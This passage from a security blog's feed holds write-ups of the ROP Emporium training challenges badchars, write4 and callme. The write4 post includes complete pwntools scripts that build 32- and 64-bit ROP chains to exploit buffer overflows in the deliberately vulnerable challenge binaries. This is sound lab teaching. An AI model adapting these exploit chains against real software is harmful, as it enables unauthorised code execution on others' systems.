+    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'x'</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x6</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_gadget</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_print_file</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="ROP"/><category term="GDB"/><category term="pwndbg"/><category term="pwntools"/><category term="formatting"/><category term="links"/><category term="binexp"/><summary type="html"><![CDATA[ROP Emporium challenge 5 - badchars]]></summary></entry><entry><title type="html">ROP Emporium - write4</title><link href="https://parroquet.github.io/blog/2022/write4/" rel="alternate" type="text/html" title="ROP Emporium - write4"/><published>2022-12-30T20:38:00+00:00</published><updated>2022-12-30T20:38:00+00:00</updated><id>https://parroquet.github.io/blog/2022/write4</id><content type="html" xml:base="https://parroquet.github.io/blog/2022/write4/"><![CDATA[<h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/write4.html">https://ropemporium.com/challenge/write4.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>The aim of this challenge is to write the string “flag.txt” to an area of free memory so that the imported function <strong>print_file</strong> can be called with this argument which would print the flag. For this we need to utilise multiple ROP gadgets to build a ROP chain which can do this for us.</p> <p> </p> <p><img src="../../../assets/img/write_img/1checksec.png" alt="checksec" width="750"/></p> <p>The first step is to run <strong>checksec</strong> in order to find protections. Like usual, NX in enabled and partial RELRO exists so a ROP chain is required.</p> <p> </p> <p><img src="../../../assets/img/write_img/2rabin.png" alt="rabin" width="750"/></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see the address of the print_file function which we will need to call. However, nothing else of use seeems to be present and we will need to utilise writeable memory locations to store strings.</p> <p> </p> <p><img src="../../../assets/img/write_img/3sections.png" alt="sections" width="750"/></p> <p>The <strong>rabin2</strong> command can then be used with the -S flag to list all the sections with addresses, virtual size and permissions. We need a writeable area of memory to store our flag.txt string with atleast 0x8 bytes of space so that the string will fit. We have two options here:</p> <ul> <li>the .got.plt section with 0x18 bytes of space</li> <li>the .data section with 0x8 bytes of space</li> </ul> <p> </p> <p><img src="../../../assets/img/write_img/7datasection.png" alt="datasection" width="750"/></p> <p>After looking at both the .data section and .got.plt section within Ghidra, we can see that the .data section has 0x8 bytes worth of free, unfilled space whereas the .got.plt section has data within it. Therefore, we can copy down the .data address as our string storage point for our ROP chain.</p> <p> </p> <p><img src="../../../assets/img/write_img/4functions.png" alt="functions" width="750"/></p> <p>Opening the binary in pwndbg, we can use <strong>info functions</strong> to list all the functions present in the binary. We can see similar functions from previous challenges and we can look at these further in Ghidra to see if there is anything that may help us exploit this binary.</p> <p> </p> <p><img src="../../../assets/img/write_img/5ghidramain.png" alt="ghidramain" width="750"/> <img src="../../../assets/img/write_img/6ghidrauseful.png" alt="ghidrauseful" width="750"/></p> <p>As we can see, the binary is very simple and we require a way to call this function with the “flag.txt” string instead of “nonexistent”.</p> <p> </p> <p><img src="../../../assets/img/write_img/8cyclic.png" alt="cyclic" width="750"/></p> <p>Next, the offset needs to be found for the buffer overflow. We can find this using <strong>cyclic 100</strong> and printing this value into the binary input to see where it crashes.</p> <p> </p> <p><img src="../../../assets/img/write_img/9offset.png" alt="offset" width="750"/></p> <p>As the EIP register contains “laaa”, we can use the command <strong>cyclic -l laaa</strong> to find the offset at which the buffer overflow occurs. This is 44 bytes.</p> <p> </p> <p><img src="../../../assets/img/write_img/10disasuseful.png" alt="disasuseful" width="750"/></p> <p>Using the <strong>disas</strong> command we can dissassemble the usefulFunction function to find the address of the <strong>print_file</strong> function. Using just the <strong>print_file</strong> function, we will require a junk return address included within our payload to impersonate the return address being set by the <strong>call</strong> instruction. We do not have to include this junk address if we use the address for the entire <strong>call print_file</strong> instruction on the left.</p> <p> </p> <p><img src="../../../assets/img/write_img/11disasgadgets.png" alt="disasgadgets" width="750"/></p> <p>Looking at the usefulGadgets function, we can see a gadget - <strong>mov DWORD PTR [edi],ebp</strong> which we can use to move the value in ebp into the address at edi. This is useful as we can use this to move the address of the .data section into edi and then move the string “flag.txt” into ebp. This will then write the string into the .data section. We can then call the <strong>print_file</strong> instruction with the address of the .data section as the argument to print the flag. This is the goal written in the description for this challenge.</p> <p> </p> <p><img src="../../../assets/img/write_img/13ropgadget.png" alt="ropgadget" width="750"/></p> <p>We then need a way to populate ebp and edi registers so that the mov gadget will work. For this we need to search for a gadget. We can use the <strong>ROPgadget</strong> command to search for a gadget that will pop ebp and edi into the registers and then return. We can see that the gadget <strong>pop edi; pop ebp; ret</strong> exists so we can copy down its address.</p> <p> </p> <p><img src="../../../assets/img/write_img/14order.png" alt="order" width="750"/></p> <p>Now that we have all the building blocks to solve this challenge, we need to put them in the correct order so that our payload does as we wish. The order is shown above where we first populate the memory location of the .data section with the string “flag” and then repeat what we did for the remaining 4 bytes of the string - “.txt”. Keep in mind, we need to do this string separately because 32 bit architecture does things in blocks of 4 bytes. Additionally, each string will need to be reversed within our ROP chain as when writing to memory, the bytes are written in reverse order.</p> <p> </p> <p><img src="../../../assets/img/write_img/15scriptexecution.png" alt="scriptexecution" width="750"/></p> <p>Instead of manually writing out addresses, we can put this into a python3 script using pwntools to solve the challenge. The script used is displayed at the end of the post as usual.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit architecture handles arguments for calls differently to 32 bit so our exploit will look slightly different. We also do not need to handle the string in blocks of 4 bytes as 64 bit architecture increases this to 8 bytes.</p> <p> </p> <p><img src="../../../assets/img/write_img/18usefulFunc.png" alt="usefulFunc" width="750"/></p> <p>Looking at the <strong>usefulFunction</strong> function within the 64 bit binary, we can see the address for the <strong>print_file</strong> function we need to call.</p> <p> </p> <p><img src="../../../assets/img/write_img/19disasusefulGadget.png" alt="disasusefulGadget" width="750"/></p> <p>Looking at the <strong>usefulGadgets</strong> function, we can see a different gadget to before - <strong>mov QWORD PTR [r14],r15 ; ret</strong>. This is useful as it tells us that we can move a quad word - 16 bytes worth of string into the address held in the r14 register. We can copy down the address for this.</p> <p> </p> <p><img src="../../../assets/img/write_img/17ropgadgetpop.png" alt="ropgadgetpop" width="750"/></p> <p>In order to populate the r14 and r15 registers, we need to search for a gadget which will pop r14 and r15 into the registers and then return. We can use the <strong>ROPgadget</strong> command to search for a gadget that will do this. We can see that the gadget <strong>pop r14; pop r15; ret</strong> exists so we can copy down its address.</p> <p> </p> <p><img src="../../../assets/img/write_img/20datasection.png" alt="datasection" width="750"/></p> <p>We need to find the .data section which we know is writable and can store our 0x8 bytes of stirng. Within pwndbg, the command <strong>info target</strong> to list all the sections of the binary. We find the address of the .data section and the address can be noted.</p> <p> </p> <p>64bit: <img src="../../../assets/img/split_img/1464bitarguments.png" alt="1464bitarguments" width="750"/> <img src="../../../assets/img/write_img/21fillparam.png" alt="fillparam" width="750"/></p> <p>As seen before in previous challenges, the 64 bit architecture requires the arguments to be passed in the registers seen above. This means that we need to use a ROP gadget which is <strong>pop rdi; ret</strong> to populate the rdi register with the address of the .data section so that we can use the <strong>print_file</strong> function and print the flag. We can use the <strong>ROPgadget</strong> command to search for a gadget that will do this shown above. We can see that the gadget <strong>pop rdi; ret</strong> exists so we can copy down its address.</p> <p> </p> <p><img src="../../../assets/img/write_img/22cyclic.png" alt="cyclic" width="750"/></p> <p>Before we create our exploit, we need an offset. We can do this via the <strong>cyclic 100</strong> command and then copying the pattern into the input field of the running program. The first 8 bytes of the RSP register can then be used to find the offset to make the buffer overflow successful.</p> <p> </p> <p><img src="../../../assets/img/write_img/23offset.png" alt="offset" width="750"/></p> <p>We can use the command <strong>cyclic -l faaaaaaa</strong> to find the offset. We can see that the offset is 40 bytes.</p> <p> </p> <p><img src="../../../assets/img/write_img/24order.png" alt="order" width="750"/></p> <p>Finally, the order for the exploit can be created. Firstly, we need to fill the offset with junk ‘A’ values. We then want to populate the .data section with our string. We pop the two values for the .data section address and flag.txt string from the stack into the r14 and r15 registers accordingly. The mov gadget can then be used to write this string to the .data section. The last 3 instructions are in charge of printing the flag where we will first populate the rdi register to set an argument for the <strong>print_file</strong> function and then we call the <strong>print_file</strong> function.</p> <p> </p> <p><img src="../../../assets/img/write_img/25scriptexecution.png" alt="scriptexecution" width="750"/></p> <p>Instead of manually writing out addresses, we can put this into a python3 script using pwntools to solve the challenge. The script used is displayed at the end of the post as usual.</p> <p> </p> <h3 id="the-32-bit-python-script">The 32 bit python script</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./write432'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="c1"># Address needed to put parameters in registers
+</span><span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0804a018</span>
+<span class="n">mov_gadget</span> <span class="o">=</span> <span class="mh">0x08048543</span>
+<span class="n">pop_gadget</span> <span class="o">=</span> <span class="mh">0x080485aa</span>
+<span class="n">flagstr</span> <span class="o">=</span> <span class="mh">0x67616C66</span>
+<span class="n">txtstr</span> <span class="o">=</span> <span class="mh">0x7478742E</span>    <span class="c1"># writing text to memory requires little endian so it can be converted to big
+</span><span class="n">print_file</span> <span class="o">=</span> <span class="mh">0x080483d0</span>
+<span class="n">junkaddr</span> <span class="o">=</span> <span class="mh">0x61616161</span>
+
+<span class="c1"># junkaddr is needed as we are calling the function print_file, we don't need this
+# if we use the address of "call print_file@plt" instead of "print_file@plt" as
+# the functionality of call is then done for us (writing return address to stack)
+</span>
+<span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x08048538</span>
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov DWORD[edi], ebp"</span><span class="p">,</span> <span class="n">mov_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop edi ; pop ebp ; ret"</span><span class="p">,</span> <span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x flag string"</span><span class="p">,</span> <span class="n">flagstr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x .txt string"</span><span class="p">,</span> <span class="n">txtstr</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x print_file function"</span><span class="p">,</span> <span class="n">print_file</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
+
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x random junk address"</span><span class="p">,</span> <span class="n">junkaddr</span><span class="p">)</span>
+
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="c1"># Print out the address of EIP at the time of crashing
+</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
+<span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">eip_offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">flagstr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="c1"># +4 so that we don't overwrite our "flag" string
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">txtstr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">print_file</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div> <p> </p> <h3 id="the-64-bit-python-script">The 64 bit python script</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">##### SETUP &amp; RUN #####
+</span>
+<span class="c1">#Define the executable
+</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./write4'</span>
+
+<span class="c1"># This will automatically get context arch, bits, os etc
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># verbose logging so we can see what is being sent
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="c1">#delete corefiles after crash occurs
+</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="c1"># run the elf
+</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+
+<span class="c1">##### FIND USEFUL ADDRESSES #####
+</span>
+<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
+</span>
+<span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x0000000000400620</span>
+<span class="n">mov_qword_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400628</span>
+<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400693</span>
+<span class="n">pop_r14_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400690</span>
+<span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0000000000601028</span>
+<span class="n">flagtxtstr</span> <span class="o">=</span> <span class="mh">0x7478742E67616C66</span>
+
+
+<span class="c1"># Print out the target address
+</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov QWORD PTR [r14],r15"</span><span class="p">,</span> <span class="n">mov_qword_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi ; ret"</span><span class="p">,</span> <span class="n">pop_rdi_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop 14 ; pop r15 ; ret"</span><span class="p">,</span> <span class="n">pop_r14_gadget</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x flag.txt string"</span><span class="p">,</span> <span class="n">flagtxtstr</span><span class="p">)</span>
+
+
+<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
+</span>
+<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+
+<span class="c1"># Send cyclic pattern to crash it
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Wait for the process to crash
+</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="c1"># Open up the corefile created after crash
+</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>
+
+<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
+# With this snippet of the pattern, we know the exact offset from
+# the beginning of our controlled data to the return address.
+</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="c1"># Note that we have to call pop_rdi gadget here
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flagtxtstr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_qword_gadget</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_print_file</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="ROP"/><category term="GDB"/><category term="pwndbg"/><category term="pwntools"/><category term="formatting"/><category term="links"/><category term="binexp"/><summary type="html"><![CDATA[ROP Emporium challenge 4 - write4]]></summary></entry><entry><title type="html">ROP Emporium - callme</title><link href="https://parroquet.github.io/blog/2022/callme/" rel="alternate" type="text/html" title="ROP Emporium - callme"/><published>2022-12-28T23:00:00+00:00</published><updated>2022-12-28T23:00:00+00:00</updated><id>https://parroquet.github.io/blog/2022/callme</id><content type="html" xml:base="https://parroquet.github.io/blog/2022/callme/"><![CDATA[<h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/callme.html">https://ropemporium.com/challenge/callme.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>The aim of this challenge is to call 3 functions provided through library imports named callme_one, callme_two and callme_three along with 3 specific parameters for each (0xdeadbeef, 0xcafebabe, 0xd00df00d).</p> <p> </p> <p><img src="../../../assets/img/callme_img/1checksec.png" alt="checksec" width="750"/></p> <p>The first step is to run <strong>checksec</strong> in order to find protections. Like usual, NX in enabled and partial RELRO exists so a ROP chain is required.</p> <p> </p> <p><img src="../../../assets/img/callme_img/2rabin.png" alt="rabin" width="750"/></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see any interesting information in strings we can use as well as addresses of functions we can use in our exploits.</p> <p> </p> <p><img src="../../../assets/img/callme_img/3ghidra.png" alt="ghidra" width="750"/> <img src="../../../assets/img/callme_img/5pwnme.png" alt="pwnme" width="750"/> <img src="../../../assets/img/callme_img/6useful.png" alt="useful" width="750"/></p> <p>Next we can look at Ghidra and understand better how the functions available may work. A buffer overflow can be determined through the pwnme function input fields. We can also see this new function called usefulFunction which includes calls to the functions we need to call within the ROP chain. This is useful as we can use the addresses of these functions for the ROP.</p> <p> </p> <p><img src="../../../assets/img/callme_img/7cyclic.png" alt="cyclic" width="750"/></p> <p>Through running the <strong>cyclic 100</strong> command within pwndbg and then running the binary with our cyclic value, we can use this to find the offset by taking the value from the EIP register.</p> <p> </p> <p><img src="../../../assets/img/callme_img/8offset.png" alt="offset" width="750"/></p> <p>Using <strong>cyclic -l laaa</strong> we can find the offset is 44 bytes.</p> <p> </p> <p><img src="../../../assets/img/callme_img/9addrcallme.png" alt="addrcallme" width="750"/></p> <p>Again by going into pwndbg we can note down the addresses of the callme functions by disassembling usefulFunction.</p> <p> </p> <p><img src="../../../assets/img/callme_img/10order.png" alt="order" width="750"/></p> <p>Next we need to determine the order for our ROP chain. As parameters will be called off the stack as we are using 32 bit architecture, we can simply add the offset followed by the callme function call, parameters and repeating this. However, as we repeatedly call the different callme functions, a new stack frame is created each time and the parameters we write to the stack will be overwritten. Therefore, we need a ROP gadget.</p> <p> </p> <p><img src="../../../assets/img/callme_img/11ropgadget.png" alt="gadget" width="750"/></p> <p>We need to find a rop gadget which pops values off the stack which would have been written by the new stack frame. This is done by using the <strong>ROPgadget</strong> command. We can see the gadget we need is <strong>pop esi; pop edi; pop ebp; ret</strong> as it will pop 3 values off the stack which matches the amount of parameters we need to pass to each function.</p> <p> </p> <p><img src="../../../assets/img/callme_img/12orderupdated.png" alt="orderupdated" width="750"/></p> <p>The order can now be updated placing the gadget before the parameters get put on the stack.</p> <p> </p> <p><img src="../../../assets/img/callme_img/13payloadcallmeone.png" alt="callmeone" width="750"/></p> <p>To check we have done this correctly, we can start by trying to call the first function call with our parameters with python2 and using little endian format. As we can see, the program outputs callme_one() called correctly so we know we are on the right path.</p> <p> </p> <p><img src="../../../assets/img/callme_img/14completepayload.png" alt="completepayload" width="750"/></p> <p>Finishing the payload, we can see the flag has been printed. The python script for this will be displayed at the end of the post.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit architecture handles arguments for system calls differently to 32 bit so our exploit will look slightly different. Parameters used this time will be 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d.</p> <p> </p> <p>64bit: <img src="../../../assets/img/split_img/1464bitarguments.png" alt="1364bitarguments" width="750"/></p> <p>As seen before in previous challenges, the 64 bit architecture requires the arguments to be passed in the registers seen above. This means that we need to use a ROP gadget which is <strong>pop rdi; pop rsi; pop rdx; ret</strong>. This will pop the 3 arguments off the stack and into the correct registers for arg0, arg1 and arg2.</p> <p> </p> <p><img src="../../../assets/img/callme_img/15cyclic.png" alt="cyclic" width="750"/></p> <p>Again we can use the cyclic command to find the offset. We take the first 8 bytes of the RSP value overwritten.</p> <p> </p> <p><img src="../../../assets/img/callme_img/16offset.png" alt="offset" width="750"/></p> <p>Using the <strong>cyclic -l faaaaaaa</strong> command we can find the offset is 40 bytes.</p> <p> </p> <p><img src="../../../assets/img/callme_img/17gadgets.png" alt="gadgets" width="750"/></p> <p>We need to find the new 64 bit address of the callme functions. We can do this by dissasembling the usefulFunction again in pwndbg. Provided is also a new function called usefulGadgets which includes the ROP gadget which will pop the 3 arguments off the stack and into the correct registers <strong>pop rdi ; pop rsi ; pop rdx ; ret</strong>. We can grab the address by disassembling this function or using the command <strong>p usefulGadgets</strong>.</p> <p> </p> <p><img src="../../../assets/img/callme_img/18order.png" alt="order" width="750"/></p> <p>The order of the ROP chain will have to be slightly different to the 